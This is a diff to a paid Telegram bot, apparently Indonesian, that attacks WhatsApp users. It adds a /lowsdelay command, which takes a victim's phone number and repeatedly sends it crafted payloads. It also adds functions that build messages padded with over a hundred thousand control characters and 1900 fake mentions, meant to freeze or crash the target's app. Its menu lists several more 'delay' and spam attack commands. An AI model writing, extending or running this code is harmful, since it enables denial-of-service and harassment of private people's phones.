@@ -1,4 +1,4 @@
-    ///CREDIT BASE BY AMBALABU 
+ ///CREDIT BASE BY AMBALABU 
 /// NO HAPUS CREDIT 
 (function() {
   'use strict'
@@ -547,7 +547,7 @@ if (!validTokens.length) {
 » Information:
 ☇ Creator : @Bawzhhh
 ☇ Name Script : Gxion New Era
-☇ Version : Auto Update
+☇ System : Auto Update
 
 ❌ Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
 `);
@@ -586,9 +586,9 @@ function startBot() {
 » Information:
 ☇ Creator : @Bawzhhh
 ☇ Name Script : Gxion New Era
-☇ Version : Auto Update
+☇ System : Auto Update
   
-  Bot Berhasil Terhubung Gunakan Script Sebrutal Mungkin`))
+  Bot Berhasil Terhubung System Deteksi Bypass Akan Di Lepas Secara Otomatis`))
 }
 
 validateToken()
@@ -622,7 +622,7 @@ const startSesi = async () => {
 » Information:
 ☇ Creator : @Bawzhhh
 ☇ Name Script : Gxion New Era
-☇ Version : Auto Update
+☇ System : Auto Update
 ☇ Bot Connect
 `);
 
@@ -690,7 +690,7 @@ const startSesi = async () => {
 » Information:
 ☇ Creator : @Bawzhhh
 ☇ Name Script : Gxion New Era
-☇ Version : Auto Update
+☇ System : Auto Update
 ☇ Bot Connect
 ☇ WhatsApp Number : ${linkedWhatsAppNumber}
 `);
@@ -702,12 +702,12 @@ const startSesi = async () => {
               global.pairingMessage.chatId,
               global.pairingMessage.messageId,
               undefined,
-`<pre>⬡═―⊱「 𝑮𝑿𝑰𝑶𝑵 」⊰―═⬡
+`<blockquote>☾. ⬡═―⊱「 𝑮𝑿𝑰𝑶𝑵 」⊰―═⬡ ࣪ ִֶָ☾.
        
   ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
 ϟ    Number : ${linkedWhatsAppNumber}
 ϟ    Status : Connected
-</pre>`,
+`;
               { parse_mode: "HTML" }
             );
 
@@ -1083,7 +1083,7 @@ async function sendHome(ctx) {
 
   const caption = `
 <blockquote>☾. ⬡═―⊱「 𝔾   𝕏   𝕀   𝕆   ℕ 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
-<blockquote>📩 INFORMATION</blockquote>
+<blockquote>☾. ⬡═―⊱「 📩 INFORMATION 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
 ◇ Developer : @Bawzhhh
 ◇ Version   : 1.0 New Era
 ◇ System    : Auto-Update
@@ -1167,7 +1167,7 @@ async function showxbugs(ctx, page = 1) {
   if (page === 1) {
     caption = `
 <blockquote>☾. ⬡═―⊱「 𝔾   𝕏   𝕀   𝕆   ℕ 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
-<blockquote>📩 INFORMATION</blockquote>
+<blockquote>☾. ⬡═―⊱「 📩 INFORMATION 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
 ◇ Developer : @Bawzhhh
 ◇ Version   : 1.0 New Era
 ◇ System    : Auto-Update
@@ -1177,8 +1177,9 @@ async function showxbugs(ctx, page = 1) {
 ◇ /specterdelay   62xxx  → Delay No Kenon
 ◇ /delayworek     62xxx  → Hard Delay (Maybe)
 ◇ /EquarTerdelay  62xxx  → One Shot Delay
-◇ /qiSys          62xxx  → Hard Spam No Kenon
 ◇ /dangerdelay    62xxx  → Invisible Delay 100%
+◇ /qiSys          62xxx  → Hard Spam No Kenon
+◇ /lowsdelay    62xxx  → Currently Delay Invisible
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
 
@@ -1195,7 +1196,7 @@ async function showxbugs(ctx, page = 1) {
   if (page === 2) {
     caption = `
 <blockquote>☾. ⬡═―⊱「 𝔾   𝕏   𝕀   𝕆   ℕ 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
-<blockquote>📩 INFORMATION</blockquote>
+<blockquote>☾. ⬡═―⊱「 📩 INFORMATION 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
 ◇ Developer : @Bawzhhh
 ◇ Version   : 1.0 New Era
 ◇ System    : Auto-Update
@@ -1245,7 +1246,7 @@ bot.action("tools", async (ctx) => {
 
   const caption = `
 <blockquote>☾. ⬡═―⊱「 𝔾   𝕏   𝕀   𝕆   ℕ 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
-<blockquote>📩 INFORMATION</blockquote>
+<blockquote>☾. ⬡═―⊱「 📩 INFORMATION 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
 ◇ Developer : @Bawzhhh
 ◇ Version   : 1.0 New Era
 ◇ System    : Auto-Update
@@ -2200,7 +2201,38 @@ bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
     }
   })();
 });
- 
+/// CASE BUG BEBAS SPAM 5 ///
+bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 Example: /lowsdelay 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.sendPhoto("https://files.catbox.moe/pm6sti.jpg", {
+    caption: `
+<pre>交 Gxion System Attacks ᝄ
+
+"⬡═―━⊱[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 ]⊰━—═⬡
+☇ Target: ${q}
+☇ Status: Succes
+☇ Type: MEDIUM DELAY 
+</pre>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
+    },
+  });
+
+  (async () => {
+    for (let i = 0; i < 5; i++) {
+  await FrZinTrS(sock, target);
+  await sleep(1500);
+  
+  await delayGabuts(sock,target);
+  await sleep(3000);
+    }
+  })();
+}); 
 // ------------ (  FUNCTION BUGS ) -------------- \\
 async function DelayHardNullVnX(sock, target, ptcp = true) {
  
@@ -2687,6 +2719,65 @@ async function delayHold(sock, target) {
   });
 }
 
+async function fvckmklu(sock, target) {
+  const tagMeta = Array.from(
+    { length: 1900 },
+    (_, v1nz) => `86705131476${v1nz}@s.whatsapp.net`
+  );
+
+  const msg = generateWAMessageFromContent(
+    target,
+    {
+      interactiveResponseMessage: {
+        body: {
+          text: "\x10",
+          format: "DEFAULT"
+        },
+        nativeFlowResponseMessage: {
+          name: "address_message",
+          paramsJson: "\x10".repeat(111111),
+          version: 3
+        },
+        contextInfo: {
+          mentionedJid: tagMeta
+        }
+      }
+    },
+    {}
+  );
+
+  for (let i = 0; i < 10; i++) {
+    await client.relayMessage(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: msg.message
+        }
+      },
+      {
+        messageId: msg.key.id,
+        participant: { jid: target }
+      }
+    );
+
+    await sleep(1500);
+  }
+}
+
+async function delayGabuts(sock, target) {
+  var jut = {
+    interactiveResponseMessage: {
+      name: "galaxy_message",
+      paramsJson: "\u0000".repeat(145000),
+      version: 3
+    },
+        nativeFlowResponseMessage: {
+          text: "# ArT - Gabuts ¡",
+          format: "DEFAULT"
+        }
+      };
+    await sock.relayMessage(target, jut, {});
+  }
 // --- Jalankan Bot --- //
 (async () => {
   try {
